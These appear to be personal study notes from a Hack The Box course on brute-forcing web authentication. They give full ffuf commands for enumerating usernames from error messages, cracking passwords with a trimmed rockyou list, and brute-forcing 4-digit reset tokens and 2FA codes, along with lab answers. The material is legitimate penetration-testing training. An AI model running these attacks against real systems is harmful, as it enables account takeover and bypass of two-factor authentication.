# Brute-Force Attacks

## Enumerating Users

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

On the other hand, a valid username results in a different error message:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Enumerating Users via Differing Error Messages

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

On the other hand, when we attempt to log in with a registered user such as `htb-stdnt` and an invalid password, we can see a different error:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Let us exploit this difference in error messages returned and use SecLists's wordlist `xato-net-10-million-usernames.txt` to enumerate valid users with `ffuf`. We can specify the wordlist with the `-w` parameter, the POST data with the `-d` parameter, and the keyword `FUZZ` in the username to fuzz valid users. Finally, we can filter out invalid users by removing responses containing the string `Unknown user`:

&#x20; Enumerating Users

```shell-session
eldeim@htb[/htb]$ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"

<SNIP>

[Status: 200, Size: 3271, Words: 754, Lines: 103, Duration: 310ms]
    * FUZZ: consuelo
```

We successfully identified the valid username `consuelo`. We could now proceed by attempting to brute-force the user's password, as we will discuss in the following section.

### PoCs - Questions

* Enumerate a valid user on the web application. Provide the username as the answer.

<pre><code>ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://83.136.249.246:45898/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&#x26;password=invalid" -fr "Unknown user"
<strong>&#x3C;SNIP>
</strong><strong>cookster                [Status: 200, Size: 3271, Words: 754, Lines: 103, Duration: 533ms]                [Status: 200, Size: 3271, Words: 754, Lines: 103, Duration: 533ms]
</strong></code></pre>

## Brute-Forcing Passwords

When accessing the sample web application, we can see the following information on the login page:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

For instance, the popular password wordlist `rockyou.txt` contains more than 14 million passwords:

```shell-session
eldeim@htb[/htb]$ wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

14344391 /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Now, we can use `grep` to match only those passwords that match the password policy implemented by our target web application, which brings down the wordlist to about 150,000 passwords, a reduction of about 99%:

```shell-session
eldeim@htb[/htb]$ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

eldeim@htb[/htb]$ wc -l custom_wordlist.txt

151647 custom_wordlist.txt
```

To start brute-forcing passwords, we need a user or a list of users to target. Using the techniques covered in the previous section, we determine that admin is a username for a valid user, therefore, we will attempt brute-forcing its password.

However, first, let us intercept the login request to know the names of the POST parameters and the error message returned within the response:

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Upon providing an incorrect username, the login response contains the message (substring) "Invalid username", therefore, we can use this information to build our `ffuf` command to brute-force the user's password:

```shell-session
eldeim@htb[/htb]$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4764ms]
    * FUZZ: Buttercup1
```

### PoCs - Questions

* What is one prominent issue with passwords?

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

According to the policy, I shorten the dictionary rockyou -->

```
grep '[[:upper:]]' /usr/share/wordlist/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

Now see the error and create the ffuf-->

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
ffuf -w ./custom_wordlist.txt -u http://94.237.57.57:48478/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password"
```

## Brute-Forcing Password Reset Tokens

### Identifying Weak Reset Tokens

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To identify weak reset tokens, we typically need to create an account on the target web application, request a password reset token, and then analyze it. In this example, let us assume we have received the following password reset e-mail:

```
Hello,

We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:

1. Click on the following link to reset your password: Click

2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351

Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this e-mail.

Thank you.
```

As we can see, the password reset link contains the reset token in the GET-parameter `token`. In this example, the token is `7351`. Given that the token consists of only a 4-digit number, there can be only `10,000` possible values. This allows us to hijack users' accounts by requesting a password reset and then brute-forcing the token.

***

### Attacking Weak Reset Tokens

We will use `ffuf` to brute-force all possible reset tokens. First, we need to create a wordlist of all possible tokens from `0000` to `9999`, which we can achieve with `seq`:

```shell-session
eldeim@htb[/htb]$ seq -w 0 9999 > tokens.txt
```

The `-w` flag pads all numbers to the same length by prepending zeroes, which we can verify by looking at the first few lines of the output file:

```shell-session
eldeim@htb[/htb]$ head tokens.txt

0000
0001
0002
0003
0004
0005
0006
0007
0008
0009
```

Assuming that there are users currently in the process of resetting their passwords, we can try to brute-force all active reset tokens. If we want to target a specific user, we should send a password reset request for that user first to create a reset token. We can then specify the wordlist in `ffuf` to brute-force all active reset-tokens:

```shell-session
eldeim@htb[/htb]$ ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"

<SNIP>

[Status: 200, Size: 2667, Words: 538, Lines: 90, Duration: 1ms]
    * FUZZ: 6182
```

By specifying the reset token in the GET-parameter `token` in the `/reset_password.php` endpoint, we can reset the password of the corresponding account, enabling us to take over the account:

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### PoCs - Questions

* Takeover another user's account on the target system to obtain the flag.\


First recovey the password of admin and go to point the token endpoint -->

```
http://83.136.251.37:47393/reset_password.php?token=
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now ffuf, for this endopint but first create a diccionary tokens -->

```
seq -w 0 9999 > tokens.txt
## Then -->
ffuf -w ./tokens.txt -u http://83.136.251.37:47393/reset_password.php?token=FUZZ -fr "The provided token is invalid"
<SNIP>
4784                    [Status: 200, Size: 2920, Words: 596, Lines: 92, Duration: 16ms]
```

## Brute-Forcing 2FA Codes

### Attacking Two-Factor Authentication (2FA)

For our lab, we will assume that we obtained valid credentials in a prior phishing attack: `admin:admin`. However, the web application is secured with 2FA, as we can see after logging in with the obtained credentials:

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The message in the web application shows that the TOTP is a 4-digit code. Since there are only `10,000` possible variations, we can easily try all possible codes. To achieve this, let us first take a look at the corresponding request to prepare our parameters for `ffuf`:

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As we can see, the TOTP is passed in the `otp` POST parameter. Furthermore, we need to specify our session token in the `PHPSESSID` cookie to associate the TOTP with our authenticated session. Just like in the previous section, we can generate a wordlist containing all 4-digit numbers from `0000` to `9999` like so:

```shell-session
eldeim@htb[/htb]$ seq -w 0 9999 > tokens.txt
```

Afterward, we can use the following command to brute-force the correct TOTP by filtering out responses containing the `Invalid 2FA Code` error message:

```shell-session
eldeim@htb[/htb]$ ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"

<SNIP>
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 648ms]
    * FUZZ: 6513
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 635ms]
    * FUZZ: 6514

<SNIP>
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
```

### PoCs - Questions

* Brute-force the admin user's 2FA code on the target system to obtain the flag.

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

First create the diccionay tokens then exploit with fuff -->

```
seq -w 0 9999 > tokens.txt
##
ffuf -w ./tokens.txt -u http://94.237.54.192:43778/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=5d10iq80aq0vi4enihe9j815gv" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

> Remember chain the cookie of admin login
